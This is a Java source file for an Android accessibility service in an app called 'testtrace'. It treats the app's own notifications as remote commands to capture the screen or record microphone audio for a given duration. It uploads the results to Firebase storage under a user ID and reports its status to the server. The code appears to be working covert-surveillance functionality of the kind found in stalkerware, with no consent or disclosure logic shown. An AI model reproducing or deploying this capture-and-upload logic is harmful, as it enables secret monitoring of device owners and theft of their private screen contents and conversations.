package com.reiserx.testtrace.Screenshot;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Models.AudiosDownloadUrl;
import com.reiserx.testtrace.Models.TaskSuccess;
import com.reiserx.testtrace.Utilities.getRandom;

import java.io.File;
import java.util.Calendar;
import java.util.concurrent.Executor;

public class accessibilityService extends android.accessibilityservice.AccessibilityService {

    private static final int RECORDER_SAMPLERATE = 8000;
    private MediaRecorder recorder;

    String TAG = "AccessibilityService.logs";

    FirebaseDatabase mdb;
    DatabaseReference reference;

    TaskSuccess taskSuccess;

    public static accessibilityService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        instance = this;
        updateAccessibility();
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {
                    Log.d(TAG, "Recieved event");
                    Parcelable data = accessibilityEvent.getParcelableData();
                    if (data instanceof Notification) {
                        Log.d(TAG, "Recieved notification");
                        Notification notification = (Notification) data;

                        if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {

                            String title = notification.extras.getString("android.title");
                            if (title.contains("com.reiserx.testtrace.accessibility")) {
                                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
                                String UserID = save.getString("UserID", "");

                                int message = Integer.parseInt(notification.extras.getString("android.text"));
                                switch (message) {
                                    case 1:
                                        takeScreenshots(UserID);
                                        instance = accessibilityService.this;
                                        updateAccessibility();
                                        break;
                                    case 2:
                                        long value = Long.parseLong(title.replaceAll("[\\D]", ""));
                                        final Handler handler = new Handler(Looper.getMainLooper());
                                        startRecording();
                                        handler.postDelayed(() -> stopRecording(UserID), value);
                                        instance = accessibilityService.this;
                                        updateAccessibility();
                                        break;
                                    case 3:
                                        instance = accessibilityService.this;
                                        updateAccessibility();
                                        break;
                                }
                            }
                        }
                    }
                }
            }
            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
                if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
                    Log.d(TAG, "back");
                    instance = this;
                } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
                    Log.d(TAG, "home");
                    instance = this;
                }
            }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
        super.takeScreenshot(displayId, executor, callback);
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        int action = event.getAction();
        int keyCode = event.getKeyCode();

        if (action == KeyEvent.ACTION_UP) {
            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
                Log.d(TAG, "KeyUp");
                instance = this;
                updateAccessibility();
            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
                Log.d(TAG, "KeyDown");
                instance = this;
                updateAccessibility();
            }
        }
        return super.onKeyEvent(event);
    }


    public void takeScreenshots(String UserID) {

        mdb = FirebaseDatabase.getInstance();
        reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");

        taskSuccess = new TaskSuccess("Capturing screenshot", true, false);
        reference.setValue(taskSuccess);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                    getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(@NonNull ScreenshotResult screenshotResult) {

                            taskSuccess.setMessage("Screenshot captured");
                            taskSuccess.setSuccess(true);
                            reference.setValue(taskSuccess);
                            Log.i(TAG, "onSuccess");
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());

                            saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.this, reference, taskSuccess);
                            String filename = getRandom.getRandom(0, 1000000000) + ".png";
                            saveBitmap.saveData(filename, UserID);
                        }

                        @Override
                        public void onFailure(int i) {

                            taskSuccess.setMessage("Capture failed " + i);
                            taskSuccess.setSuccess(false);
                            taskSuccess.setFinal(true);
                            reference.setValue(taskSuccess);
                            Log.i(TAG, "onFailure code is " + i);

                        }
                    });
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
                ScreenshotObserver screenshotObserver = new ScreenshotObserver();
                screenshotObserver.Observer(UserID, taskSuccess, reference);
            }
        }
    }

    public void startRecording() {
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(RECORDER_SAMPLERATE);

            final String filePath = this.getFilesDir() + "/Audios/" + "check" + ".mp3";
            final File file = new File(filePath);
            file.getParentFile().mkdirs();
            recorder.setOutputFile(filePath);

            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
            String UserID = save.getString("UserID", "");
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
    }

    public void stopRecording(String UserID) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                final String filePath = this.getFilesDir() + "/Audios/" + "check" + ".mp3";
                final File file = new File(filePath);
                updateAudioToServer(UserID, file);
            }
        } catch (Exception e) {
            e.printStackTrace();
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
    }

    public void updateAudioToServer(String UserID, File filePath) {
        FirebaseStorage storage = FirebaseStorage.getInstance();
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();

        String filename = getRandom.getRandom(0, 1000000000) + ".mp3";

        DocumentReference collectionReference = firestore.collection("Main").document(UserID).collection("AudioRecordings").document(filename);
        StorageReference reference = storage.getReference().child("Main").child(UserID).child("AudioRecordings").child(filename);
        reference.putFile(Uri.fromFile(filePath)).addOnCompleteListener(task -> {
            Log.d(TAG, "uploading");
            if (task.isSuccessful()) {
                reference.getDownloadUrl().addOnSuccessListener(uri -> {
                    Log.d(TAG, "getting url");
                    Calendar cal = Calendar.getInstance();
                    long currentTime = cal.getTimeInMillis();
                    AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
                    collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> {
                        filePath.delete();
                    });
                });
            }
        });
    }

    private void updateAccessibility () {
        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
        String UserID = save.getString("UserID", "");
        String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
        FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
    }
}